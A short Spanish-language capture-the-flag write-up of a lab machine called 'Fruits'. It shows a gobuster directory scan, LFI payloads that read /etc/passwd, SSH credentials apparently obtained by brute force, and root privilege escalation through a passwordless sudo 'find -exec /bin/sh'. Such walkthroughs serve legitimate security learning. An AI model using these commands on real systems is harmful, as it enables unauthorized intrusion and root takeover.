Se realiza escaneo de dir
gobuster dir -u http://10.208.219.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,.old, jpg, py -b 404

**LFI (Local File Inclusion)** 
se encuentra archivo fruits.php 
Un **LFI (Local File Inclusion)** ocurre cuando una aplicación web incluye archivos locales en el servidor basándose en entrada controlada por el usuario, normalmente mediante un parámetro `GET`.

php?file=/etc/passwd
es un ejemplo típico relacionado con **LFI (Local File Inclusion).**

http://victima.com/index.php?file=/etc/passwd

[22][ssh] host: 10.208.219.19   login: bananaman   password: celtic

bananaman@Fruits:~$ sudo -l  
Matching Defaults entries for bananaman on Fruits:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
  
User bananaman may run the following commands on Fruits:  
   (ALL) NOPASSWD: /usr/bin/find  
   
bananaman@Fruits:~$ sudo find . -exec /bin/sh \; -quit

Eso significa que puedes ejecutar **`find` como root sin contraseña**.

---

## 🔥 Explotación usando `find` (**GTFOBins**)

El binario `find` permite ejecutar comandos usando `-exec`, lo que nos permite spawnear una shell como root.

### 💣 Método directo (más común)

sudo find . -exec /bin/sh \; -quit